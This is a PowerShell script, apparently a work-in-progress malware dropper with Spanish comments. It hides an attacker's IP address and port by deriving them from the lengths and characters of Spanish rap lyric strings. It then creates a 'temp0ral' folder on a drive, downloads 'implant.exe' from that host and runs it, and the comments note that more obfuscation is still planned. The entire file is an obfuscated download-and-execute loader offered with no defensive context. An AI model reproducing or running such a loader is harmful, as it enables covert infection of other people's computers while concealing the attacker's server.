$str1 = "Me acostumbré al sour, ya no patea" #34
$str2 = "Me llegan a casa, no se capean" #30
$str3 = "Solo modelos como Barea" #23
$str4 = "Multiplicar cienes es la tarea" #30
$str5 = "Yo soy el cacique en tu propia aldea"
$str6 = "Valgo más que todo lo que te rodea" #34
$str7 = "No te la crea, recuerda que Curry la mete" #41
$str8 = "Hasta que Lebron lo galdea" #26

$add = ($str7.Length - $str3.Length + 1).ToString() + ($str1.Length - $str4.Length - 2).ToString() + "." + ($str7.Length - 1 + $str4.Length + $str2.Length + $str6.Length + $str1.Length).ToString() + "." + ($str4.Length - $str2.Length).ToString() + "." + ($str1.Length + $str4.Length + $str6.Length + 2).ToString()
$head = "h" + $str1[31] + $str4[25] + $str2[26] + "://" + $add + ":" + $str8.IndexOf("e") + $str5.IndexOf("Y") + $str8.IndexOf("e") + $str2.IndexOf("M")

#falta ofuscar esto con el nombre final
$call = "/" + "implant.exe" 
#mas de lo mismo
$carpeta = "temp0ral\"
$malw = "implant.exe"
$unidadRed = [System.IO.DriveInfo]::GetDrives()

foreach ($i in $unidadRed) {
    $existe = Test-Path $i$carpeta
    if ($existe -eq $false) 
    {
        Write-Output "No existe"
        New-Item -Path $i$carpeta -ItemType Directory
        Invoke-WebRequest -URI $head$call -OutFile $i$carpeta$malw
        Start-Process $i$carpeta$malw
        break        
    }
    else
    {

        Start-Process $i$carpeta$malw
        break  
    }
}
